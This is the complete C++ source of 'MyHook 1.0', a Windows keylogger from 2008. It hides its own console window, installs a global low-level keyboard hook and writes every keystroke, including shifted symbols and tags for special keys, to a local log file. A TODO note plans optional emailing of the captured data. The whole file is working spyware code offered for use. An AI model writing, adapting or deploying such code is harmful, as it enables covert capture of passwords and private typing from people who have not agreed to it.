/*
    MyHook 1.0
    Copyright 2008 Daniel Amodio aka deige101
    Created for Major League Coding
    http://groups.myspace.com/MajorLeagueCoding

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/*
    TODO!

    *send log data to function instead so many print to file calls
        would be easier to trap data in a different fashion if need be
        for example, debugging (would print to console)
    *add support for more keystrokes
    *add support for command line paramaters that let the app react different
        could optionaly email data, or could run in debug mode, etc
*/

#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <iostream>
#include <time.h>

// Declare callback function
LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam );

int main()
{
    // Hide the program
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);

    // Get current time
    time_t ltime;
    ltime=time(NULL);

    // Add new session to log file
    FILE *file;
    file=fopen("log.txt","a+");
    fputs("\n\n------------------------------------------------------------------------",file);
    fputs("\n\t\t\t\t\t\t\t\tMyHook Session\t",file);
    fputs(asctime(localtime(&ltime)),file); // Add timestamp to log file
    fputs("------------------------------------------------------------------------\n",file);
    fclose(file);

    // Retrieve the applications instance
    HINSTANCE appInstance = GetModuleHandle(NULL);

    // Set a global Windows Hook to capture keystrokes.
    SetWindowsHookEx( WH_KEYBOARD_LL, LowLevelKeyboardProc, appInstance, 0 );

    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
{
    // Declare pointer to the KBDLLHOOKSTRUCT
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;


    switch(wParam)
    {
        case WM_KEYUP: // When the key has been pressed and released
        {
            // Assign keyboard code to local variable
            DWORD vkCode = pKeyBoard->vkCode;

            // Open log file
            FILE *file;
            file=fopen("log.txt","a+");

            // Process keyboard strokes
            if(file!=NULL)
            {
                if((vkCode>=39)&&(vkCode<=64)) // Keys 0-9
                {
                    if(GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
                    {
                        switch(vkCode) // 0x30-0x39 is 0-9 respectively
                        {
                            case 0x30:
                                fputc(')',file);
                                fclose(file);
                                break;
                            case 0x31:
                                fputc('!',file);
                                fclose(file);
                                break;
                            case 0x32:
                                fputc('@',file);
                                fclose(file);
                                break;
                            case 0x33:
                                fputc('#',file);
                                fclose(file);
                                break;
                            case 0x34:
                                fputc('$',file);
                                fclose(file);
                                break;
                            case 0x35:
                                fputc('%',file);
                                fclose(file);
                                break;
                            case 0x36:
                                fputc('^',file);
                                fclose(file);
                                break;
                            case 0x37:
                                fputc('&',file);
                                fclose(file);
                                break;
                            case 0x38:
                                fputc('*',file);
                                fclose(file);
                                break;
                            case 0x39:
                                fputc('(',file);
                                fclose(file);
                                break;
                        }
                    }
                    else // If shift key is not down
                        fputc(vkCode,file);
                        fclose(file);
                }
                else if((vkCode>64)&&(vkCode<91)) // Keys a-z
                {
                    if(!GetAsyncKeyState(VK_SHIFT)) // If the shift key is not down, un-capitalize letters
                    {
                        vkCode+=32;
                    }
                    fputc(vkCode,file);
                    fclose(file);
                }
                else
                {
                    switch(vkCode) // Check for other keys
                    {
                        case VK_SPACE:
                            fputc(' ',file);
                            fclose(file);
                            break;
                        case VK_RETURN:
                            fputs("[ENTER]\n",file);
                            fclose(file);
                            break;
                        case VK_BACK:
                            fputs("[BKSP]",file);
                            fclose(file);
                            break;
                        case VK_TAB:
                            fputs("[TAB]",file);
                            fclose(file);
                            break;
                        case VK_LCONTROL:
                        case VK_RCONTROL:
                            fputs("[CTRL]",file);
                            fclose(file);
                            break;
                        case VK_LMENU:
                        case VK_RMENU:
                            fputs("[ALT]",file);
                            fclose(file);
                            break;
                        case VK_CAPITAL:
                            fputs("[CAPS]",file);
                            fclose(file);
                            break;
                        case VK_ESCAPE:
                            fputs("[ESC]",file);
                            fclose(file);
                            break;
                        case VK_INSERT:
                            fputs("[INSERT]",file);
                            fclose(file);
                            break;
                        case VK_DELETE:
                            fputs("[DEL]",file);
                            fclose(file);
                            break;
                        case VK_NUMPAD0:
                            fputc('0',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD1:
                            fputc('1',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD2:
                            fputc('2',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD3:
                            fputc('3',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD4:
                            fputc('4',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD5:
                            fputc('5',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD6:
                            fputc('6',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD7:
                            fputc('7',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD8:
                            fputc('8',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD9:
                            fputc('9',file);
                            fclose(file);
                            break;
                        case VK_OEM_1:
                            if(GetAsyncKeyState(VK_SHIFT))
                                fputs(":",file);
                            else
                                fputs(";",file);
                            fclose(file);
                            break;
                        case VK_OEM_2:
                            if(GetAsyncKeyState(VK_SHIFT))
                                fputs("?",file);
                            else
                                fputs("/",file);
                            fclose(file);
                            break;
                        case VK_OEM_3:
                            if(GetAsyncKeyState(VK_SHIFT))
                                fputs("~",file);
                            else
                                fputs("`",file);
                            fclose(file);
                            break;
                        case VK_LSHIFT:
                        case VK_RSHIFT:
                            // do nothing;
                            fclose(file);
                            break;
                        default: // Catch all misc keys
                            // fputc(vkCode,file); // Un-comment this to remove gibberish from the log file
                            // printf("%c",vkCode); // Un-comment this line to debug and add support for more keys
                            fclose(file);

                    }
                }
            }
        }
        default:
            return CallNextHookEx( NULL, nCode, wParam, lParam );
    }



    return 0;
}
